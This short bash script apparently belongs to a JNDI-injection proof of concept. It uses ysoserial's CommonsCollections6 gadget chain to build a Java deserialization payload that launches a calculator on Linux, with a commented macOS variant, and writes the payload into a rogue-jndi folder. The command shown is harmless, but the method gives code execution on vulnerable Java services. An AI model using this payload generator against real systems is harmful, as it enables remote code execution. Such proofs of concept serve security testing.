#!/usr/bin/env bash

docker run --rm ysoserial CommonsCollections6 'sh -c /usr/bin/gnome-calculator' > rogue-jndi/payload.bin.linux
# Example macOS payload
#docker run --rm ysoserial CommonsCollections6 'sh -c /System/Applications/Calculator.app/Contents/MacOS/Calculator' > rogue-jndi/payload.bin.macos
